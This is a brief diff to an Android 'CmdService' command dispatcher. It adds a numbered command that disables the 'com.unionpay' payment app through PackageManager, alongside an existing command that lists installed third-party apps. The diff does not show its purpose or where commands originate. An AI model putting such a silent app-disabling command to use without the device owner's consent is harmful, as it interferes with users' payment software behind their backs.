@@ -4,6 +4,7 @@ import android.app.ActivityManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.IBinder;
 import android.util.Log;
 
@@ -52,6 +53,11 @@ public class CmdService extends Service {
 
             case 3: {
                 Tools.getInstalled3PApp(this);
+            }
+            break;
+
+            case 4: {
+                getPackageManager().setApplicationEnabledSetting("com.unionpay", PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
             }
             break;
         }
